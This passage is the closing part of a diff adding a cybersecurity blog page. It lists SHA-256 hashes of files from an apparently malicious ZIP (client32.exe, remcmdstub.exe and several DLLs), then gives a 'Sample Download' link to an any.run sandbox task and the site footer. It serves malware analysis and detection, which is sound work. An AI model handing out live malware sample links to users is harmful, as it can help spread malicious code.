+<td style="text-align:left">a74612ae5234d1a8f1263545400668097f9eb6a01dfb8037bc61ca9cae82c5b8</td>
+<td style="text-align:left">Contents of ZIP File</td>
+</tr>
+<tr>
+<td style="text-align:left">client32.exe</td>
+<td style="text-align:left">18df68d1581c11130c139fa52abb74dfd098a9af698a250645d6a4a65efcbf2d</td>
+<td style="text-align:left">Contents of ZIP File</td>
+</tr>
+<tr>
+<td style="text-align:left">client32.ini</td>
+<td style="text-align:left">36cb67c124cbf975b03a7cd5e6cf026368fd78ba7d486a78dac242c71e41ece9</td>
+<td style="text-align:left">Contents of ZIP File</td>
+</tr>
+<tr>
+<td style="text-align:left">HTCTL32.DLL</td>
+<td style="text-align:left">3c072532bf7674d0c5154d4d22a9d9c0173530c0d00f69911cdbc2552175d899</td>
+<td style="text-align:left">Contents of ZIP File</td>
+</tr>
+<tr>
+<td style="text-align:left">msvcr100.dll</td>
+<td style="text-align:left">8793353461826fbd48f25ea8b835be204b758ce7510db2af631b28850355bd18</td>
+<td style="text-align:left">Contents of ZIP File</td>
+</tr>
+<tr>
+<td style="text-align:left">nskbfltr.inf</td>
+<td style="text-align:left">d96856cd944a9f1587907cacef974c0248b7f4210f1689c1e6bcac5fed289368</td>
+<td style="text-align:left">Contents of ZIP File</td>
+</tr>
+<tr>
+<td style="text-align:left">NSM.LIC</td>
+<td style="text-align:left">f4e2f28169e0c88b2551b6f1d63f8ba513feb15beacc43a82f626b93d673f56d</td>
+<td style="text-align:left">Contents of ZIP File</td>
+</tr>
+<tr>
+<td style="text-align:left">nsm_vpro.ini</td>
+<td style="text-align:left">4bfa4c00414660ba44bddde5216a7f28aeccaa9e2d42df4bbff66db57c60522b</td>
+<td style="text-align:left">Contents of ZIP File</td>
+</tr>
+<tr>
+<td style="text-align:left">pcicapi.dll</td>
+<td style="text-align:left">2d6c6200508c0797e6542b195c999f3485c4ef76551aa3c65016587788ba1703</td>
+<td style="text-align:left">Contents of ZIP File</td>
+</tr>
+<tr>
+<td style="text-align:left">PCICHEK.DLL</td>
+<td style="text-align:left">956b9fa960f913cce3137089c601f3c64cc24c54614b02bba62abb9610a985dd</td>
+<td style="text-align:left">Contents of ZIP File</td>
+</tr>
+<tr>
+<td style="text-align:left">PCICL32.DLL</td>
+<td style="text-align:left">38684adb2183bf320eb308a96cdbde8d1d56740166c3e2596161f42a40fa32d5</td>
+<td style="text-align:left">Contents of ZIP File</td>
+</tr>
+<tr>
+<td style="text-align:left">remcmdstub.exe</td>
+<td style="text-align:left">fedd609a16c717db9bea3072bed41e79b564c4bc97f959208bfa52fb3c9fa814</td>
+<td style="text-align:left">Contents of ZIP File</td>
+</tr>
+<tr>
+<td style="text-align:left">TCCTL32.DLL</td>
+<td style="text-align:left">2b92ea2a7d2be8d64c84ea71614d0007c12d6075756313d61ddc40e4c4dd910e</td>
+<td style="text-align:left">Contents of ZIP File</td>
+</tr>
+</tbody>
+</table>
+<h3 id="sample-download">Sample Download</h3>
+<p><a href="https://app.any.run/tasks/8905ff15-325e-4ef8-b5d5-9a9519483bdd">https://app.any.run/tasks/8905ff15-325e-4ef8-b5d5-9a9519483bdd</a></p>
+
+            </div>
+        </article></main>
+</div>
+<footer class="footer">
+    <span class="footer_item"> </span>
+    &nbsp;
+
+    <div class="footer_social-icons">
+<a href="index.xml" target="_blank" rel="noopener noreferrer me"
+    title="Rss">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path d="M4 11a9 9 0 0 1 9 9" />
+    <path d="M4 4a16 16 0 0 1 16 16" />
+    <circle cx="5" cy="19" r="1" />
+</svg>
+</a>
+<a href="https://github.com/anushanlingam" target="_blank" rel="noopener noreferrer me"
+    title="Github">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path
+        d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
+    </path>
+</svg>
+</a>
+</div>
+    <small class="footer_copyright">
+        © 2023 Cyber Security Blog.
+        Powered by <a href="https://github.com/hugo-sid/hugo-blog-awesome" target="_blank" rel="noreferrer noopener">Hugo blog awesome</a>
+        theme on
+        <a href="https://gohugo.io" target="_blank" rel="noreferrer noopener">Hugo</a>.
+    </small>
+</footer><a href="#" title="Go to top" id="totop">
+    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960">
+    <path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197Z"/>
+</svg>
+
+</a>
+
+
+    
+    
+    
+    <script src="https://blog.anushanlingam.com/js/script.min.46bd451490183d25f475c182f8fe773c1c787124cec75969e37c871d76aa151f.js" integrity="sha256-Rr1FFJAYPSX0dcGC&#43;P53PBx4cSTOx1lp43yHHXaqFR8="></script>
+
+</body>
+</html>
